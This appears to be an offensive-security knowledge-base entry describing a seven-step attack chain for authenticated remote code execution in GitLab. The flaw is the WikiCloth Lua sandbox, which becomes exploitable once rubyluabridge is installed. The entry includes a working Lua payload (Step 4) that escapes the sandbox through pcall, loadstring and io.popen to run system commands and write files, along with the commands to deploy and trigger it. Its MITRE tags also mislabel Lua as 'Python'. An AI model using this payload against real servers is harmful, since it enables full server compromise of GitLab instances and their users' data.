---
id: ac-gitlab-wikicloth-rce
tags:
  - rce
  - gitlab
  - lua
  - sandbox-bypass
  - wikicloth
type: attack_chain
tools:
  - '[[tools/rvm]]'
  - '[[tools/git]]'
  - '[[tools/apt]]'
  - '[[tools/rubyluabridge]]'
  - '[[tools/WikiCloth]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Install-rubyluabridge-for-Lua-Extension]]'
  - '[[procedures/Create-GitLab-Project-and-Enable-Wiki]]'
  - '[[procedures/Clone-Project-Wiki-Repository]]'
  - '[[procedures/Create-Malicious-Wiki-Payload-File]]'
  - '[[procedures/Deploy-Wiki-Payload-via-Git]]'
  - '[[procedures/Trigger-RCE-by-Visiting-Wiki-Page]]'
  - '[[procedures/Verify-RCE-Impact-on-Server]]'
step_count: 7
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
updated_at: '2025-12-14T17:23:50.190Z'
description: >-
  Authenticated RCE in GitLab by exploiting insecure Lua sandbox in WikiCloth
  library when rubyluabridge gem is installed, allowing arbitrary command
  execution via crafted wiki pages.
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Python]]'
---
# RCE in GitLab Wiki via Lua Sandbox Bypass in WikiCloth

Multi-stage attack chain demonstrating authenticated remote code execution in GitLab by exploiting a flawed Lua sandbox in the WikiCloth library, enabled when the rubyluabridge gem is installed. An attacker with wiki edit permissions crafts a malicious wiki page containing Lua code that bypasses the sandbox using pcall and loadstring, executes system commands via io.popen, and compromises the server.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~30 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Environment] --> B[Prepare Wiki]
    B --> C[Create Payload]
    C --> D[Deploy and Execute]
    D --> E[Verify Compromise]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/rvm]]
- [[tools/git]]
- [[tools/apt]]
- [[tools/rubyluabridge]]
- [[tools/WikiCloth]]

### Target Environment

- GitLab Omnibus edition on Linux (Ubuntu recommended)
- Ruby 2.7.4 environment
- Wiki edit permissions for an authenticated user
- Access to server for setup (initially, for enabling vulnerability)

### Initial Access Requirements

- Authenticated GitLab account with project creation and wiki edit rights
- Server access to install rubyluabridge (simulates vulnerable deployment)
- Network access to GitLab instance and wiki URLs

## Detailed Attack Procedures

### Step 1: Setup Vulnerable Environment
procedure: [[procedures/Install-rubyluabridge-for-Lua-Extension]]

**Objective**: Enable the vulnerable Lua extension in WikiCloth by installing the rubyluabridge gem on the GitLab server.

**Instructions**: Install RVM and Ruby, clone and build rubyluabridge, then copy it to GitLab's Ruby lib directory using the following commands:

First, install RVM with [[commands/install-rvm]]:

```bash
curl -sSL https://get.rvm.io | bash
```

Then source RVM and install Ruby with [[commands/source-rvm]] and [[commands/rvm-install-ruby]]:

```bash
source /etc/profile.d/rvm.sh
rvm install 2.7.4
```

Clone the repo with [[commands/git-clone-rubyluabridge]]:

```bash
git clone https://github.com/neomantra/rubyluabridge
```

Install dependencies with [[commands/apt-install-deps]]:

```bash
sudo apt install liblua5.1-0-dev libboost-dev
```

Build with [[commands/build-extconf]] and [[commands/make-build]]:

```bash
./build/extconf_ubuntu.sh
make
```

Copy the .so file with [[commands/cp-rubyluabridge-so]]:

```bash
sudo cp rubyluabridge.so /opt/gitlab/embedded/lib/ruby/2.7.0/rubyluabridge.so
```

**Expected Output**: Successful installation messages, with rubyluabridge.so in place, enabling Lua in WikiCloth.

**Success Indicators**:
- Ruby 2.7.4 installed via RVM
- rubyluabridge.so copied to GitLab lib directory

### Step 2: Create Project and Enable Wiki
procedure: [[procedures/Create-GitLab-Project-and-Enable-Wiki]]

**Objective**: Set up a GitLab project with wiki functionality to host the malicious content.

**Instructions**: Log in to GitLab UI, create a new project, and enable the wiki feature. No CLI commands needed; use the web interface to add a wiki page.

**Expected Output**: Project created with wiki repository available at <project>.wiki.git.

**Success Indicators**:
- New project visible in GitLab dashboard
- Wiki enabled and accessible

### Step 3: Clone Wiki Repository
procedure: [[procedures/Clone-Project-Wiki-Repository]]

**Objective**: Obtain a local copy of the wiki repository for editing and pushing the payload.

**Instructions**: Use git to clone the wiki repo ending in .wiki.git with [[commands/git-clone-wiki]]:

```bash
git clone <wiki-url>.wiki.git
```

**Expected Output**: Local repository cloned successfully.

**Success Indicators**:
- Wiki directory cloned locally
- Ready for file additions

### Step 4: Create Malicious Wiki Payload
procedure: [[procedures/Create-Malicious-Wiki-Payload-File]]

**Objective**: Craft a wiki file containing Lua code that bypasses the sandbox to execute system commands.

**Instructions**: Create hello.wiki with Lua payload using pcall and loadstring to define an execute function with io.popen. Example payload:

```lua
<lua>
local old_print = print
pcall(function() loadstring("function execute(cmd) local handle = io.popen(cmd); local result = handle:read('*a'); handle:close(); return result end")() end)
print(execute('id'))
print(execute('echo vakzz > /tmp/ggg'))
</lua>
```

Save as hello.wiki in the cloned repo.

**Expected Output**: File created with embedded Lua exploit.

**Success Indicators**:
- hello.wiki file exists with valid Lua payload

### Step 5: Deploy Wiki Payload
procedure: [[procedures/Deploy-Wiki-Payload-via-Git]]

**Objective**: Push the malicious wiki file to trigger server-side rendering.

**Instructions**: Stage, commit, and push using [[commands/git-add-wiki]], [[commands/git-commit-wiki]], and [[commands/git-push]]:

```bash
git add hello.wiki
git commit -m 'Add exploit wiki page'
git push
```

**Expected Output**: Commit and push success messages.

**Success Indicators**:
- File pushed to remote wiki repo
- Wiki page updated on server

### Step 6: Trigger RCE Execution
procedure: [[procedures/Trigger-RCE-by-Visiting-Wiki-Page]]

**Objective**: Render the wiki page to execute the Lua payload and run system commands.

**Instructions**: Visit the wiki page URL in a browser (e.g., https://gitlab.example.com/project/wikis/hello). GitLab renders via WikiCloth, executing the Lua code.

**Expected Output**: Page displays output of 'id' command, e.g., uid=xxx(gitlab-www).

**Success Indicators**:
- Command output visible on wiki page
- RCE confirmed via displayed user info

### Step 7: Verify Server Compromise
procedure: [[procedures/Verify-RCE-Impact-on-Server]]

**Objective**: Confirm file write and full compromise on the server.

**Instructions**: Access the server and check for /tmp/ggg file created by the payload's [[commands/execute-echo-file]] and [[commands/execute-id]] commands.

```bash
ls -la /tmp/ggg
cat /tmp/ggg
```

**Expected Output**: File exists containing 'vakzz'.

**Success Indicators**:
- /tmp/ggg file present
- Demonstrates arbitrary file write and command execution

## Attack Chain Summary

### Key Achievements

1. Enabled vulnerable Lua extension in GitLab WikiCloth
2. Bypassed Lua sandbox to execute arbitrary OS commands
3. Achieved full server compromise via authenticated wiki edit

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Python]] Lua

### MITRE ATT&CK Tactics

- [[Execution]] Execution

---

*Last updated: 2023-10-01T00:00:00Z*
